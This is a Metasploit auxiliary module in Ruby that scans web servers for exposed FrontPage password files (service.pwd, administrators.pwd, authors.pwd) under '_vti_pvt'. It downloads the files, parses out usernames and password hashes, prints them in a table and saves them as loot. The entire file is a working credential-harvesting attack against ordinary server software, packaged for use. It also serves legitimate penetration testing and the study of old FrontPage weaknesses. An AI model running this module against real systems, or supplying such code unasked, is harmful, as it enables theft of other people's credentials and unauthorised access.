##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FrontPage .pwd File Credential Dump',
      'Description'    => %q{
        This module downloads and parses the '_vti_pvt/service.pwd',
        '_vti_pvt/administrators.pwd', and '_vti_pvt/authors.pwd' files on a FrontPage
         server to find credentials.
      },
      'References'     =>
        [
          [ 'PACKETSTORM', '11556'],
          [ 'URL', 'https://insecure.org/sploits/Microsoft.frontpage.insecurities.html'],
          [ 'URL', 'http://sparty.secniche.org/' ]
        ],
      'Author'         =>
        [
          'Aditya K Sood @adityaksood', # Sparty tool'
          'Stephen Haywood @averagesecguy' # Metasploit module'
        ],
      'License'        => MSF_LICENSE,
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'The base path', '/'])
    ])
  end


  def get_pass_file(fname)
    uri = normalize_uri(target_uri.path, '_vti_pvt', fname)

    vprint_status("Requesting: #{uri}")
    res = send_request_cgi({
      'uri' => uri,
      'method' => 'GET',
    })

    unless res.code == 200
      vprint_status("File #{uri} not found.")
      return nil
    end

    vprint_status("Found #{uri}.")

    unless res.body.lines.first.chomp == '# -FrontPage-'
      vprint_status("File does not contain FrontPage credentials.")
      vprint_status(res.body)
      return nil
    end

    vprint_status("Found FrontPage credentials.")
    return res.body
  end

  def run_host(ip)
    files = ['service.pwd', 'administrators.pwd', 'authors.pwd']
    creds = []

    files.each do |filename|
      source = filename.chomp('.pwd').capitalize
      contents = get_pass_file(filename)

      next if contents.nil?

      print_good("#{ip} - #{filename}")

      contents.each_line do |line|
        next if line.chomp == '# -FrontPage-'
        user = line.chomp.split(':')[0]
        pass = line.chomp.split(':')[1]

        creds << [source, user, pass]
      end
    end

    cred_table = Rex::Text::Table.new(
      'Header'  => 'FrontPage Credentials',
      'Indent'  => 1,
      'Columns' => ['Source', 'Username', 'Password Hash']
    )

    creds.each do |c|
      cred_table << c
    end

    print_line
    print_line("#{cred_table}")

    loot_name     = 'frontpage.creds'
    loot_type     = 'text/csv'
    loot_filename = 'frontpage_creds.csv'
    loot_desc     = 'FrontPage Credentials'

    p = store_loot(
      loot_name,
      loot_type,
      rhost,
      cred_table.to_csv,
      loot_filename,
      loot_desc)

    print_status "Credentials saved in: #{p}"
  end
end
